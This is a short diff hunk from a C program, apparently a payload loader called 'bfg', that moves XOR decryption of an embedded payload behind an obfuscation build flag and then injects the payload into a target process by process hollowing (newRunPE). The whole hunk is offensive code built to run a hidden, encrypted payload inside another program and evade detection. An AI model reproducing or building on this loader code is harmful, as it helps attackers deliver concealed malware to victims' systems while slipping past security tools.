@@ -143,27 +143,28 @@ int main (int argc, char **argv)
 	}
 	
 	#ifdef PROCESS_HOLLOWING
-	// Decrypt payload
-	// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
-	for(long i=0; i < payloadSize; i++)
-	{
-		payload[i] = payload[i] ^ keyByte;
-	}	
+		#ifdef XOR_OBFUSCATION
+			// Decrypt payload
+			// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
+			for(long i=0; i < payloadSize; i++)
+			{
+				payload[i] = payload[i] ^ keyByte;
+			}	
+		#endif
 	
-	// Instanciate target process
-	// Target process specified in first bfg argument argv[1]	
-	// Command line arguments for payload in second bfg argument argv[2]
-	if(!argv[2]) 
-	{
-		// Handle empty command line arguments for payload executable
-		// Relevant if user does not specify "" as second bfg argument
-		newRunPE(argv[1], payload, "");
-	} else
-	{
-		// Instanciate and pass command line arguments
-		newRunPE(argv[1], payload, argv[2]);
-	}
-	
+		// Instanciate target process
+		// Target process specified in first bfg argument argv[1]	
+		// Command line arguments for payload in second bfg argument argv[2]
+		if(!argv[2]) 
+		{
+			// Handle empty command line arguments for payload executable
+			// Relevant if user does not specify "" as second bfg argument
+			newRunPE(argv[1], payload, "");
+		} else
+		{
+			// Instanciate and pass command line arguments
+			newRunPE(argv[1], payload, argv[2]);
+		}	
 	#endif
 
 	#ifdef LOADEXEC_DLL
